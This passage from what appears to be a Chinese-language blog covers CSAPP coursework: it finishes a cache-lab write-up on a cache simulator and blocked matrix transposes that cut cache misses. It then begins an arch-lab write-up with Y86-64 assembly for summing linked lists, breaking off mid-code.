class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-type">char</span> opt;<br>    <span class="hljs-type">int</span> s, E, b;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * s:S=2^s是组的个数</span><br><span class="hljs-comment">     * E:每组中有多少行</span><br><span class="hljs-comment">     * b:B=2^b每个缓冲块的字节数</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">-1</span> != (opt = getopt(argc, argv, <span class="hljs-string">&quot;hvs:E:b:t:&quot;</span>)))<br>    &#123;<br>        <span class="hljs-keyword">switch</span> (opt)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;h&#x27;</span>:<br>            print_help();<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>:<br>            verbose = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>            s = atoi(optarg);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;E&#x27;</span>:<br>            E = atoi(optarg);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span>:<br>            b = atoi(optarg);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;t&#x27;</span>:<br>            <span class="hljs-built_in">strcpy</span>(t, optarg);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            print_help();<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>    &#125;<br>    Init_Cache(s, E, b); <span class="hljs-comment">//初始化一个cache</span><br>    get_trace(s, E, b);<br>    free_Cache();<br>    <span class="hljs-comment">// printSummary(hit_count, miss_count, eviction_count)</span><br>    printSummary(hit_count, miss_count, eviction_count);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202311171809124.png" alt="模拟结果"></p><h2 id="Part-B-Optimizing-Matrix-Transpose"><a href="#Part-B-Optimizing-Matrix-Transpose" class="headerlink" title="Part B: Optimizing Matrix Transpose"></a>Part B: Optimizing Matrix Transpose</h2><p>In Part B you will write a transpose function in trans.c that causes as few cache misses as possible.</p><p>要求本地变量最多定义12个</p><ul><li>32 × 32: 8 points if m &lt; 300, 0 points if m &gt; 600</li><li>64 × 64: 8 points if m &lt; 1, 300, 0 points if m &gt; 2, 000</li><li>61 × 67: 10 points if m &lt; 2, 000, 0 points if m &gt; 3, 000</li></ul><p>s &#x3D; 5, E &#x3D; 1, b &#x3D; 5，缓存有32组，每组一行，一行存8个int</p><h4 id="32-32"><a href="#32-32" class="headerlink" title="32*32"></a>32*32</h4><p>根据pdf的提示，这里肯定要使用矩阵<strong>分块</strong>进行优化</p><p>首先考虑最最简单的转置情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">trans_submit</span><span class="hljs-params">(<span class="hljs-type">int</span> M, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> A[N][M], <span class="hljs-type">int</span> B[M][N])</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; M; j++) &#123;<br>            <span class="hljs-type">int</span> tmp = A[i][j];<br>            B[j][i] = tmp;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>以第1行为例，在从内存读 <code>A[0][0]</code> 的时候，除了 <code>A[0][0]</code> 被加载到缓存中，它之后的 <code>A[0][1]---A[0][7]</code> 也会被加载进缓存。</p><p>但是内容写入 <code>B</code> 矩阵的时候是一列一列地写入，在列上相邻的元素不在一个内存块上，这样每次写入都不命中缓存。并且一列写完之后再返回，原来的缓存可能被覆盖了，这样就又会不命中，我们来定量分析。</p><p>缓存只够存储一个矩阵的四分之一，<code>A</code>中的元素对应的缓存行每隔8行就会重复。<code>A</code>和<code>B</code>的地址由于取余关系，每个元素对应的地址是相同的</p><p>对于<code>A</code>，每8个<code>int</code>就会占满缓存的一组，所以每一行会有 32&#x2F;8 &#x3D; 4 次不命中；而对于<code>B</code>，考虑最坏情况，每一列都有 32 次不命中，由此，算出总不命中次数为 4 × 32 + 32 × 32 &#x3D; 1152。拿程序跑一下：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202311171842802.png" alt="最简单转置测试"></p><p>结果是1183，这是对角线部分两者冲突造成的</p><table><thead><tr><th>D</th><th>D</th><th></th><th></th></tr></thead><tbody><tr><td>C</td><td></td><td></td><td></td></tr><tr><td>C</td><td></td><td></td><td></td></tr><tr><td>C</td><td></td><td></td><td></td></tr></tbody></table><p>在写入<code>B</code>的前 8 行后，<code>B</code>的<code>D</code>区域就全部进入了缓存，此时如果能对<code>D</code>进行操作，那么就能利用上缓存的内容，不会<code>miss</code>；但是，暴力解法接下来操作的是<code>C</code>，每一个元素的写都要驱逐之前的缓存区，当来到第 2 列继续写<code>D</code>时，它对应的缓存行很可能已经被驱逐了，于是又要<code>miss</code>，也就是说，暴力解法的问题在于没有充分利用上已经进入缓存的元素</p><p>分块解决的就是同一个矩阵内部缓存块相互替换的问题。</p><p>由上述分析，显然应考虑 8 × 8 分块，这样在块的内部不会冲突，接下来判断<code>A</code>与<code>B</code>之间会不会冲突</p><p><code>A</code>中块占用的是缓存的第 0，4，8，12，16，20，24，28组，而<code>B</code>中块占用的是缓存的第2，6，10，14，18，16，30组，刚好不会冲突。事实上，<strong>除了对角线</strong>，<code>A</code>与<code>B</code>中对应的块都不会冲突。所以，我们的想法是可行的，写出代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">transpose_submit</span><span class="hljs-params">(<span class="hljs-type">int</span> M, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> A[N][M], <span class="hljs-type">int</span> B[M][N])</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i += <span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; M; j += <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">8</span>; k++)<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> s = <span class="hljs-number">0</span>; s &lt; <span class="hljs-number">8</span>; s++)<br>                    B[j + s][i + k] = A[i + k][j + s];<br>&#125;<br></code></pre></td></tr></table></figure><p>对于<code>A</code>中每一个操作块，只有每一行的第一个元素会不命中，所以为8次不命中；对于<code>B</code>中每一个操作块，只有每一列的第一个元素会不命中，所以也为 8 次不命中。总共<code>miss</code>次数为：8 × 16 × 2 &#x3D; 256</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202311171853615.png" alt="第二次测试"></p><p>以<code>A</code>的一个对角线块<code>p</code>，<code>B</code>与<code>p</code>相应的对角线块<code>q</code>为例，复制前， <code>p</code> 在缓存中。 复制时，<code>q</code>会驱逐<code>p</code>。 下一个开始复制 <code>p</code> 又被重新加载进入缓存驱逐 <code>q</code>，这样就会多产生两次<code>miss</code>。</p><p>如何解决这种问题呢？题目给了我们提示：</p><blockquote><p>You are allowed to define at most 12 local variables of type int per transpose function</p></blockquote><p>考虑使用 8 个本地变量一次性存下 <code>A</code> 的一行后，再复制给 <code>B</code>，代码如下：</p><p>对于非对角线上的块，本身就没有额外的冲突；对于对角线上的块，写入<code>A</code>每一行的第一个元素后，这一行的元素都进入了缓存，我们就立即用本地变量存下这 8 个元素，随后再复制给<code>B</code>。这样，就避免了第一个元素复制时，<code>B</code>把<code>A</code>的缓冲行驱逐，导致没有利用上<code>A</code>的缓冲。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">transpose_submit</span><span class="hljs-params">(<span class="hljs-type">int</span> M, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> A[N][M], <span class="hljs-type">int</span> B[M][N])</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i += <span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">32</span>; j += <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = i; k &lt; i + <span class="hljs-number">8</span>; k++)<br>            &#123;<br>                <span class="hljs-type">int</span> a_0 = A[k][j];<br>                <span class="hljs-type">int</span> a_1 = A[k][j+<span class="hljs-number">1</span>];<br>                <span class="hljs-type">int</span> a_2 = A[k][j+<span class="hljs-number">2</span>];<br>                <span class="hljs-type">int</span> a_3 = A[k][j+<span class="hljs-number">3</span>];<br>                <span class="hljs-type">int</span> a_4 = A[k][j+<span class="hljs-number">4</span>];<br>                <span class="hljs-type">int</span> a_5 = A[k][j+<span class="hljs-number">5</span>];<br>                <span class="hljs-type">int</span> a_6 = A[k][j+<span class="hljs-number">6</span>];<br>                <span class="hljs-type">int</span> a_7 = A[k][j+<span class="hljs-number">7</span>];<br>                B[j][k] = a_0;<br>                B[j+<span class="hljs-number">1</span>][k] = a_1;<br>                B[j+<span class="hljs-number">2</span>][k] = a_2;<br>                B[j+<span class="hljs-number">3</span>][k] = a_3;<br>                B[j+<span class="hljs-number">4</span>][k] = a_4;<br>                B[j+<span class="hljs-number">5</span>][k] = a_5;<br>                B[j+<span class="hljs-number">6</span>][k] = a_6;<br>                B[j+<span class="hljs-number">7</span>][k] = a_7;<br>            &#125;         <br>&#125;<br></code></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202311171855951.png" alt="第三次测试"></p><h4 id="64-64"><a href="#64-64" class="headerlink" title="64*64"></a>64*64</h4><p>每4行就会占满一行缓存，先考虑先考虑 4 × 4 分块，结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202311171905736.png" alt="64*64第一次测试"></p><p>还是考虑 8 × 8 分块，由于存在着每 4 行就会占满一个缓存的问题，在分块内部处理时就需要技巧了，我们把分块内部分成 4 个 4 × 4 的小分块分别处理：</p><ul><li>第一步，将<code>A</code>的左上和右上一次性复制给<code>B</code></li><li>第二步，用本地变量把<code>B</code>的右上角存储下来</li><li>第三步，将<code>A</code>的左下复制给<code>B</code>的右上</li><li>第四步，利用第二步存储<code>B</code>的右上角的本地变量，把<code>A</code>的右上复制给<code>B</code>的左下</li><li>第五步，把<code>A</code>的右下复制给<code>B</code>的右下</li></ul><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs inform7">void transpose_64x64(int M, int N, int A<span class="hljs-comment">[N]</span><span class="hljs-comment">[M]</span>, int B<span class="hljs-comment">[M]</span><span class="hljs-comment">[N]</span>)<br>&#123;<br>    int a_0, a_1, a_2, a_3, a_4, a_5, a_6, a_7;<br>    for (int i = 0; i &lt; 64; i += 8)&#123;<br>        for (int j = 0; j &lt; 64; j += 8)&#123;<br>            for (int k = i; k &lt; i + 4; k++)&#123;<br>                // 得到A的第1,2块<br>                a_0 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 0]</span>;<br>                a_1 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 1]</span>;<br>                a_2 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 2]</span>;<br>                a_3 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 3]</span>;<br>                a_4 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 4]</span>;<br>                a_5 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 5]</span>;<br>                a_6 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 6]</span>;<br>                a_7 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 7]</span>;<br>                // 复制给B的第1,2块<br>                B<span class="hljs-comment">[j + 0]</span><span class="hljs-comment">[k]</span> = a_0;<br>                B<span class="hljs-comment">[j + 1]</span><span class="hljs-comment">[k]</span> = a_1;<br>                B<span class="hljs-comment">[j + 2]</span><span class="hljs-comment">[k]</span> = a_2;<br>                B<span class="hljs-comment">[j + 3]</span><span class="hljs-comment">[k]</span> = a_3;<br>                B<span class="hljs-comment">[j + 0]</span><span class="hljs-comment">[k + 4]</span> = a_4;<br>                B<span class="hljs-comment">[j + 1]</span><span class="hljs-comment">[k + 4]</span> = a_5;<br>                B<span class="hljs-comment">[j + 2]</span><span class="hljs-comment">[k + 4]</span> = a_6;<br>                B<span class="hljs-comment">[j + 3]</span><span class="hljs-comment">[k + 4]</span> = a_7;<br>            &#125;<br>            for (int k = j; k &lt; j + 4; k++)&#123;<br>                // 得到B的第2块<br>                a_0 = B<span class="hljs-comment">[k]</span><span class="hljs-comment">[i + 4]</span>;<br>                a_1 = B<span class="hljs-comment">[k]</span><span class="hljs-comment">[i + 5]</span>;<br>                a_2 = B<span class="hljs-comment">[k]</span><span class="hljs-comment">[i + 6]</span>;<br>                a_3 = B<span class="hljs-comment">[k]</span><span class="hljs-comment">[i + 7]</span>;<br>                // 得到A的第3块<br>                a_4 = A<span class="hljs-comment">[i + 4]</span><span class="hljs-comment">[k]</span>;<br>                a_5 = A<span class="hljs-comment">[i + 5]</span><span class="hljs-comment">[k]</span>;<br>                a_6 = A<span class="hljs-comment">[i + 6]</span><span class="hljs-comment">[k]</span>;<br>                a_7 = A<span class="hljs-comment">[i + 7]</span><span class="hljs-comment">[k]</span>;<br>                // 复制给B的第2块<br>                B<span class="hljs-comment">[k]</span><span class="hljs-comment">[i + 4]</span> = a_4;<br>                B<span class="hljs-comment">[k]</span><span class="hljs-comment">[i + 5]</span> = a_5;<br>                B<span class="hljs-comment">[k]</span><span class="hljs-comment">[i + 6]</span> = a_6;<br>                B<span class="hljs-comment">[k]</span><span class="hljs-comment">[i + 7]</span> = a_7;<br>                // B原来的第2块移动到第3块<br>                B<span class="hljs-comment">[k + 4]</span><span class="hljs-comment">[i + 0]</span> = a_0;<br>                B<span class="hljs-comment">[k + 4]</span><span class="hljs-comment">[i + 1]</span> = a_1;<br>                B<span class="hljs-comment">[k + 4]</span><span class="hljs-comment">[i + 2]</span> = a_2;<br>                B<span class="hljs-comment">[k + 4]</span><span class="hljs-comment">[i + 3]</span> = a_3;<br>            &#125;<br>            for (int k = i + 4; k &lt; i + 8; k++)<br>            &#123;<br>                // 处理第4块<br>                a_4 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 4]</span>;<br>                a_5 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 5]</span>;<br>                a_6 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 6]</span>;<br>                a_7 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 7]</span>;<br>                B<span class="hljs-comment">[j + 4]</span><span class="hljs-comment">[k]</span> = a_4;<br>                B<span class="hljs-comment">[j + 5]</span><span class="hljs-comment">[k]</span> = a_5;<br>                B<span class="hljs-comment">[j + 6]</span><span class="hljs-comment">[k]</span> = a_6;<br>                B<span class="hljs-comment">[j + 7]</span><span class="hljs-comment">[k]</span> = a_7;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202311171910654.png" alt="64*64第二次测试"></p><h4 id="61-67"><a href="#61-67" class="headerlink" title="61*67"></a>61*67</h4><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs excel">void transpose_61x67(<span class="hljs-built_in">int</span> M, <span class="hljs-built_in">int</span> <span class="hljs-built_in">N</span>, <span class="hljs-built_in">int</span> A[<span class="hljs-built_in">N</span>][M], <span class="hljs-built_in">int</span> B[M][<span class="hljs-built_in">N</span>])&#123;<br>    for (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">N</span>; i += <span class="hljs-number">16</span>)<br>        for (<span class="hljs-built_in">int</span> j = <span class="hljs-number">0</span>; j &lt; M; j += <span class="hljs-number">16</span>)<br>            for (<span class="hljs-built_in">int</span> k = i; k &lt; i + <span class="hljs-number">16</span> &amp;&amp; k &lt; <span class="hljs-built_in">N</span>; k++)<br>                for (<span class="hljs-built_in">int</span> s = j; s &lt; j + <span class="hljs-number">16</span> &amp;&amp; s &lt; M; s++)<br>                    B[s][k] = A[k][s];<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202311171914483.png" alt="61*67测试"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202311171938540.png" alt="总成绩"></p><ul><li>太库鲁西了，太菜了做不出来，参考了许多大佬的代码，逻辑思维能力太差劲了</li><li>整个lab向我们展示了计算机缓存的美。个人感觉替换策略可以重新思考怎么优化；在看书就能意识到仅仅是代码上的不同就能带来性能上的巨大差距。</li></ul>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cache</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp arch_lab</title>
    <link href="/2023/09/10/csapp-arch-lab/"/>
    <url>/2023/09/10/csapp-arch-lab/</url>
    
    <content type="html"><![CDATA[<h1 id="csapp-lab-arch-lab"><a href="#csapp-lab-arch-lab" class="headerlink" title="csapp lab arch_lab"></a>csapp lab arch_lab</h1><h2 id="初见arch-lab"><a href="#初见arch-lab" class="headerlink" title="初见arch lab"></a>初见arch lab</h2><p>In this lab, you will learn about the design and implementation of a pipelined Y86-64 processor, optimizing both it and a benchmark program to maximize performance. You are allowed to make any semanticspreserving transformation to the benchmark program, or to make enhancements to the pipelined processor, or both. When you have completed the lab, you will have a keen appreciation for the interactions between code and hardware that affect the performance of your programs. </p><p>The lab is organized into three parts, each with its own handin. In Part A you will write some simple Y86-64 programs and become familiar with the Y86-64 tools. In Part B, you will extend the SEQ simulator with a new instruction. These two parts will prepare you for Part C, the heart of the lab, where you will optimize the Y86-64 benchmark program and the processor design.</p><h2 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h2><p>这一部分主要使用Y86-64汇编语言改写C语言程序，示例在<code>example.c</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* linked list element */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ELE</span> &#123;</span><br>    <span class="hljs-type">long</span> val;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ELE</span> *<span class="hljs-title">next</span>;</span><br>&#125; *list_ptr;<br></code></pre></td></tr></table></figure><p>可以看到其给出了<code>链表</code>的数据结构定义</p><h3 id="sumlist"><a href="#sumlist" class="headerlink" title="sumlist"></a>sumlist</h3><p>第一个程序要求<strong>迭代</strong>求和链表元素之和，我们的程序应该包括设计栈空间，引用函数，并且停止。同时给出了测试所用的案例。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* sum_list - Sum the elements of a linked list */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">sum_list</span><span class="hljs-params">(list_ptr ls)</span><br>&#123;<br>    <span class="hljs-type">long</span> val = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (ls) &#123;<br>val += ls-&gt;val;<br>ls = ls-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> val;<br>&#125;<br></code></pre></td></tr></table></figure><p>一个简单但标准的Y86-64程序结构可以参考书上的252页。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># sum_list - Sum the elements of a linked list</span><br><span class="hljs-comment"># Execution begins at address 0</span><br>        .pos <span class="hljs-number">0</span><br>        irmovq stack, %rsp      <span class="hljs-comment"># Set up stack pointer</span><br>        call main               <span class="hljs-comment"># Execute main program</span><br>        halt                    <span class="hljs-comment"># Terminate program</span><br><br><span class="hljs-comment"># Sample linked list</span><br>        .align <span class="hljs-number">8</span><br>ele1:<br>        .quad <span class="hljs-number">0x00a</span><br>        .quad ele2<br>ele2:<br>        .quad <span class="hljs-number">0x0b0</span><br>        .quad ele3<br>ele3:<br>        .quad <span class="hljs-number">0xc00</span><br>        .quad <span class="hljs-number">0</span><br><br>main:<br>        irmovq ele1,%rdi<br>        call sum_list<br>        ret<br><br><span class="hljs-comment"># long sum_list(list_ptr ls)</span><br><span class="hljs-comment"># start in %rdi</span><br>sum_list:<br>        irmovq $0, %rax         <span class="hljs-comment"># rax stores val</span><br>        jmp test<br><br>loop:<br>        mrmov<span class="hljs-string">q (%rdi)</span>, %rsi     <br>        addq %rsi, %rax<br>        mrmovq <span class="hljs-number">8</span>(%rdi), %rdi<br><br>test:<br>        andq %rdi, %rdi<br>        jne loop<br>        ret<br><br><span class="hljs-comment"># Stack starts here and grows to lower addresses</span><br>        .pos <span class="hljs-number">0x200</span><br>stack:<br><br></code></pre></td></tr></table></figure><p>使用yas编译，使用yis模拟运行程序</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202309101138376.png" alt="sum.yo"></p><p>看到rax寄存器中结果为0xcba，程序运行正确。</p><h3 id="rsum-list"><a href="#rsum-list" class="headerlink" title="rsum_list"></a>rsum_list</h3><p>使用<strong>递归</strong>计算链表元素之和。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* rsum_list - Recursive version of sum_list */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">rsum_list</span><span class="hljs-params">(list_ptr ls)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!ls)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">long</span> val = ls-&gt;val;<br><span class="hljs-type">long</span> rest = rsum_list(ls-&gt;next);<br><span class="hljs-keyword">return</span> val + rest;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># /* rsum_list - Recursive version of sum_list */</span><br><span class="hljs-comment"># Execution begins at address 0</span><br>        .pos <span class="hljs-number">0</span><br>        irmovq stack, %rsp      <span class="hljs-comment"># Set up stack pointer</span><br>        call main               <span class="hljs-comment"># Execute main program</span><br>        halt                    <span class="hljs-comment"># Terminate program</span><br><br><span class="hljs-comment"># Sample linked list</span><br>        .align <span class="hljs-number">8</span><br>ele1:<br>        .quad <span class="hljs-number">0x00a</span><br>        .quad ele2<br>ele2:<br>        .quad <span class="hljs-number">0x0b0</span><br>        .quad ele3<br>ele3:<br>        .quad <span class="hljs-number">0xc00</span><br>        .quad <span class="hljs-number">0</span><br><br>main:<br>        irmovq ele1,%rdi<br>        call rsum_list<br>        ret<br><br><span class="hljs-comment"># long sum_list(list_ptr ls)</span><br><span class="hljs-comment"># start in %rdi</span><br>rsum_list:<br>        andq %rdi, %rdi<br>        je <span 